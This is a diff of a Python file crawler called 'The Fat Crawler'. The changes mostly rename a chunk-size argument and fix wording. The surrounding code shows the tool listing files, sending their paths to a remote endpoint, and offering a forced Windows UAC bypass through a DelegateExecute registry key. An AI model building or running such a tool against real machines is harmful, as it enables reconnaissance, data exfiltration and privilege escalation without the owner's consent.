@@ -7,12 +7,12 @@ The Fat Crawler.
 This is a simple file crawler that performs a recursive lookup on the given folder and file type.
 The current supported arguments to run this crawler are:
 
--d --dir       The start directory path
--t --file-type The file type to lookup
--c --chunck    The chunck size to report to the server
--e --endpoint  The endpoint to report the enumerated files
--f --force-uac Forces an UAC bypass
--v --verbose   Enables the verbose mode
+-d --dir        The start directory path
+-t --file-type  The file type to lookup
+-c --chunk-size The chunk size to report to the server
+-e --endpoint   The endpoint to report the enumerated files
+-f --force-uac  Forces an UAC bypass
+-v --verbose    Enables the verbose mode
 
 Note: The script will try to bypass the UAC if the the operational system is a "NT family"
       and the user has no administrative privileges.
@@ -37,7 +37,7 @@ except:
 parser = argparse.ArgumentParser(prog='fatcrawler',  description='The Fat Crawler')
 parser.add_argument('-d', '--dir',       metavar = '',        required=True, help = 'The start directory')
 parser.add_argument('-t', '--file-type', metavar = '',        required=True, help = 'The file type')
-parser.add_argument('-c', '--chunck',    metavar ='',         default=10,    help = 'The chunck size to report to the server')
+parser.add_argument('-c', '--chunk-size',metavar = '',        default=10,    help = 'The chunk size to report to the server')
 parser.add_argument('-e', '--endpoint',  metavar = '',        required=True, help = 'The endpoint url to send the enumerated files')
 parser.add_argument('-f', '--force-uac', action='store_true', help='Force UAC bypass')
 parser.add_argument('-v', '--verbose',   action='store_true', help='Enables the verbose mode')
@@ -65,7 +65,7 @@ DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
 
 def is_running_as_admin():
     '''
-    Checks if the script is running with administrator privileges.
+    Checks if the script is running with administrative privileges.
     Returns True if is running as admin, False otherwise.
     '''
     if os.name == 'nt':        
@@ -150,7 +150,7 @@ def execute(args):
             files.append(file_path)
             log.info('[+] File found: {}'.format(file_path))
 
-            if len(files) == args.chunck:
+            if len(files) == args.chunk_size:
                 files_copy = list(files)
                 thread = threading.Thread(target=report_data, args=(args.endpoint, files_copy))
                 thread.start()                
